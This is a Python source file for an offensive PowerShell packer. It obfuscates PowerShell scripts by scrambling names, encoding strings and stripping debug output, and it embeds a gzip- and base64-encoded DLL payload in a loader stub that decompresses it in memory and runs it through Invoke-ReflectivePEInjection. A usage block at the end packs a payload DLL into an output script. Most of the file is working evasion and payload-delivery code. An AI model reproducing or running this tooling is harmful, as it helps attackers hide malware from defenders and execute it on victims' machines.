import gzip
import random
import string
import re
import base64
import StringIO

# an unfortunately large amount of the obfuscator code comes from my older archives
# unfortunately I didn't think to comment much of it

protected_variables = ["$", "?", "^", "args", "confirmpreference", "consolefilename", "debugpreference", "error", "erroractionpreference", "errorview", "executioncontext", "false", "formatenumerationlimit", "home", "host", "input", "maximumaliascount", "maximumdrivecount", "maximumerrorcount", "maximumfunctioncount", "maximumhistorycount", "maximumvariablecount", "myinvocation", "nestedpromptlevel", "null", "outputencoding", "pid", "profile", "progresspreference", "psboundparameters", "pscommandpath", "psculture", "psdefaultparametervalues", "psemailserver", "pshome", "psise", "psscriptroot", "pssessionapplicationname", "pssessionconfigurationname", "pssessionoption", "psuiculture", "psunsupportedconsoleapplications", "psversiontable", "pwd", "shellid", "stacktrace", "true", "verbosepreference", "warningpreference", "whatifpreference", "pscmdlet","name", "value"]

protected_values = ['LocalFile', 'WebFile', 'Bytes', 'WString', 'String', 'Void', 'void',
                    'ParameterSetName', 'ValidateSet', 'Size', 'size']
protected_whitespace_line_values = ['CmdletBinding','param', 'function', '{', '}', 'if', 'else', 'while', 'for', 'switch']
protected_whitespace_line_values_ = r'CmdLetBinding|param|function|Function|\{|\}|if|else|while|for|switch'

def f7(seq):
    seen = set()
    seen_add = seen.add
    return [x for x in seq if not (x in seen or seen_add(x))]


def extractBetweenMatchingChar(begin_ch, end_ch, text, index=0):
    i = text.find(begin_ch, index)
    count = 0
    for c in text[i:]:
        if c == begin_ch:
            count += 1
        if c == end_ch:
            count -= 1
            if count == 0:
                break
        i += 1
    return i+1


def code_between_parens(code):
    i = code.find('(')
    j = i
    betw_parens = []
    while i < len(code):
        i = extractBetweenMatchingChar('(', ')', code, index=i)
        betw_parens.append(code[j:i])
        i = code.find('(', i)
        if j > i: break
        j = i
    return betw_parens


def match_exclude_lines_with_strings(expression, data):
    # match regex pattern to exclude a string
    # this doesn't actually work properly and could be done
    # in regex without this
    expression = re.compile(expression, re.IGNORECASE)
    return expression.findall(data)


def gen_alpha(variable_length=8):
    return ''.join(random.choice(string.letters) for _ in range(variable_length))


def gen_alpha_value_table(variable_length=8):
    table = []
    for c in range(32, 126):
        table.append({'var': gen_alpha(variable_length), 'val': chr(c)})
    return table


def encode_strings(code, variable_length=8):
    # NOTE: can encode numbers too!
    # NOTE: can also get more creative with how strings are stored... a table at the top is pretty obvious
    find_strings_1 = re.compile("(\"[\w].*?\")")
    find_strings_2 = re.compile("(\'[\w].*?\')")
    ignore_parameter_strings_1 = re.compile('ParameterSetName\s?=\s?(\'[\w].*?\')', flags=re.DOTALL | re.IGNORECASE)
    ignore_parameter_strings_2 = re.compile('ParameterSetName\s?=\s?(\"[\w].*?\")', flags=re.DOTALL | re.IGNORECASE)

    _strings = f7(find_strings_1.findall(code)+(find_strings_2.findall(code)))
    ignore_strings = f7(ignore_parameter_strings_1.findall(code)+ignore_parameter_strings_2.findall(code))
    for line in code.split('\n'):
        if 'ValidateSet' in line:
            for x in f7(find_strings_1.findall(line)+find_strings_2.findall(line)):
                ignore_strings.append(x)
    for ignore in f7(ignore_strings):
        _strings.remove(ignore)

    table = gen_alpha_value_table()
    for st in _strings:
        j = []
        for char in st:
            k = ((item for item in table if item['val'] == char).next())
            j.append(k["var"])
        repl = '"$'+'$'.join(j[1:len(j)-1])+'"'
        code = code.replace(st, repl)
    for t in table:
        if t['val'] in ['`', '&']:
            code = '$'+t['var']+'=\'`'+t['val']+'\'\n' + code
        elif t['val'] in ['\'']:
            code = '$'+t['var']+'="`'+t['val']+'"\n' + code
        #elif t['val'] in ['@', '#']:
        #    # I'm deleting these for convenience, fortunately I've not found them in any strings
        #    pass
        else:
            code = '$'+t['var']+'=\''+t['val']+'\'\n' + code
    return code


def remove_unnecessary_whitespace(code):
    for p in code_between_parens(code):
        code = code.replace(p, p.replace('\n', ''))

    _code = ''
    for line in code.split('\n'):
        line_restricted = False
        for protected in protected_whitespace_line_values:
            if protected.lower() in line.lower():
                line_restricted = True
        if line_restricted:
            _code += line + '\n'
        else:
            _code += line + ';'
    code = _code.replace('\n{\n', '{').replace('\n}\n', '}')
    return code


def scramble_variables(code, variable_length=8):
    find_variables = re.compile(r"\$([a-z].*?)\W", re.IGNORECASE)
    variables = f7(find_variables.findall(code))
    for variable in variables:
        gen = ''
        if not variable.lower() in protected_variables:
            replacement_variable = gen_alpha(variable_length)
            code = re.sub(r'(\W[\$\-])'+variable+r'(\b)', r'\1'+replacement_variable+r'\2', code, flags=re.IGNORECASE)
    return code


def scramble_functions(code, function_length=8):
    functions = f7(match_exclude_lines_with_strings(r'function\s([a-z\-].*?)[\s\{]', code))
    for f in functions:
        replacement_function = gen_alpha(function_length)
        code = code.replace(f, replacement_function)
    return code

def compact(code, remove_debug=False, remove_artificial_endlines=True, remove_whitespace_statement=True,
            remove_whitespace_equation=True, remove_repeating_whitespace=True,
            remove_comments=True, remove_empty_lines=True):
    # note: None of this is actually safe on every powershell script
    if remove_debug:
        # NOTE: this should come first, otherwise it wipes out the whole line... should rework this
        remove_debug_1 = re.compile('(Write-Verbose.*)')
        remove_debug_2 = re.compile('(Write-Debug.*)')
        remove_debug_3 = re.compile('(Write-Error.*)')
        remove_debug_4 = re.compile('(Write-Warning.*)')
        remove_debug_5 = re.compile('(throw) .*', re.IGNORECASE)
        # NOTE: this also deletes the associated action
        code = re.sub(remove_debug_1, "", code)
        code = re.sub(remove_debug_2, "", code)
        code = re.sub(remove_debug_3, "", code)
        code = re.sub(remove_debug_4, "", code)
        code = re.sub(remove_debug_5, r"\1 '1'", code)

    # remove artificial endlines
    if remove_artificial_endlines:
        code = code.replace('`\n', '')

    # remove whitespace surrounding statements
    # let's make sure we got them all... is there a better way to do this?
    if remove_whitespace_statement:
        for _ in range(5):
            code = re.sub(r'\s?([\+\-]?[\=\;\,\|])\s?', r'\1', code)
        code = re.sub(r'\s([\-\+])\s', r'\1', code)

    # remove whitespace surrounding equations
    if remove_whitespace_equation:
        code = re.sub(r'\s([\-\+])\s', r'\1', code)

    # remove repeating whitespace
    if remove_repeating_whitespace:
        code = re.sub(r'(\s).*?(\S)', r'\1\2', code)

    # remove comments
    if remove_comments:
        comments_1 = re.compile("(<\#.*?\#>)", re.DOTALL)
        comments_2 = re.compile('(\#.*)')
        code = re.sub(comments_1, "", code)
        code = re.sub(comments_2, "", code)

    # remove empty lines
    if remove_empty_lines:
        ret = []
        for line in code.split('\n'):
            if (not re.match(r'^\s*$', line)):
                ret.append(line)
        code = '\n'.join(ret)
    return code


def generate_loader(reflective_loader, payload):
    # compress and base64 encode payload
    out = StringIO.StringIO()
    with gzip.GzipFile(fileobj=out, mode="w") as f:
        f.write(payload)
    compresed_payload = base64.b64encode(out.getvalue())

    loader_stub = '''
    # Contents of Invoke-ReflectivePEInjection go here
    {0}
    # compressed and encoded payload goes here
    $encodedPayload="{1}"
    # decode payload to memorystream
    $buffer=New-Object byte[](1024)
    $msDecompressedPayload=New-Object System.IO.MemoryStream
    $decodedPayload=[System.Convert]::FromBase64String($encodedPayload)
    $msDecodedPayload=New-Object System.IO.MemoryStream (,$decodedPayload)
    # decompress payload within memorystream
    $gzipStream=New-Object System.IO.Compression.GzipStream $msDecodedPayload, ([IO.Compression.CompressionMode]::Decompress)
    while($true)
    {{
        $read=$gzipStream.Read($buffer,0,1024)
        if($read -gt 0){{
            $msDecompressedPayload.Write($buffer,0,$read)
    }}
    else{{break}}}}
    $gzipStream.Close()
    # now let's launch it!
    Invoke-ReflectivePEInjection -PEBytes $msDecompressedPayload.ToArray()
    '''.format(encode_strings(reflective_loader), compresed_payload)
    return loader_stub


def pack_dll_into_ps(reflective_loader, payload):
    reflective_loader = compact(reflective_loader)
    loader = generate_loader(reflective_loader, payload)
    loader = compact(loader, remove_debug=True, remove_comments=False)
    # loader = encode_strings(loader)
    loader = scramble_functions(loader)
    # loader = scramble_variables(loader)
    return loader

'''
invoke_reflective_filename = "templates/Invoke-ReflectivePEInjection.ps1"
payload_filename = "templates/payload.dll"
output_filename = "output.ps1"

# load Invoke-ReflectivePEInjection into buffer
with open(invoke_reflective_filename, 'r') as loader:
    reflective_loader = loader.read()
    # load PE payload into buffer
with open(payload_filename, 'rb') as payload_buffer:
    payload = payload_buffer.read()


with open(output_filename, 'w') as f:
    f.write(pack_dll_into_ps(reflective_loader, payload))


'''
